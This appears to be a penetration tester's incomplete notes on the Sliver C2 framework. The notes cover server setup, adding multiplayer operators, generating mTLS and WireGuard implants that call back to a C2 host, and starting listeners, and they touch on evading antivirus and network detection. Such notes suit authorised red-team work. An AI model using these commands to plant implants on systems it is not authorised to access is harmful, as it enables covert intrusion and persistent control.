Sliver C2 is a powerful post-exploitation framework that can be used to establish a firm foothold on a device with an extensible interface that reminds the user of Meterpreter. It is detected out of the box by most AV solutions, as it is very popular, but it can be obfuscated and otherwise made to evade detection. 

Documentation can be found here: https://sliver.sh/docs

# Server
```shell
sliver-server # start the server
```

The server functions as a fully featured point of interaction, and it is not required to use the client at all if no multiplayer is going to be used. However, if multiple operators will need to interact with compromised hosts, multiplayer mode will need to be enabled, and configuration files will need to be generated. 

# Multiplayer
Multiplayer mode allows other users (players) to connect to the C2 via mTLS and operate implants simultaneously with the host. For multi-person engagements, this is preferable, and easy to set up. 

```shell
new-operator --name <operator short name> --lhost <C2 server IP>
```

>[!note] The C2 server IP must be accessible as described by the operator machine. Do not provide a local IP address. Domain names may or may not be permissible. Update when we know.

This will output a configuration file that the new player can store with the `import` command.

```shell
./sliver-client import <config file>
```

On startup, Sliver will ask which server config the operator would like to use, and connect them into the C2 server.
# Implant Generation
All of the implants generation is taken care of by the `generate` command. Sliver supports HTTP, DNS, WireGuard, TCP, and mTLS callbacks for both sessions and beacons. While these can be used for evasion, mTLS is a safer bet for avoiding NIDS because of its builtin and thorough encryption both directions. 

```bash
generate --mtls <FQDN of C2:port> --os <target operating system> --arch <target CPU architecture> --save <local save location> # generate an mTLS session sliver

generate beacon --wg <FQDN of C2:port> --os <target operating system> --arch <target CPU architecture> # generate a WireGuard beacon sliver
```

Sliver also supports multiple protocols per implant, with it defaulting between them in this order: mTLS -> WireGuard -> HTTP(S) -> DNS.

You must individually start jobs receiving new connections for each protocol

```bash
mtls # start an mTLS listener
dns # start a DNS listener
# etc...
```

# Implant Usage
TODO: Fill this out
# Armory
TODO: Give more details on loading armory modules and how to use them effectively.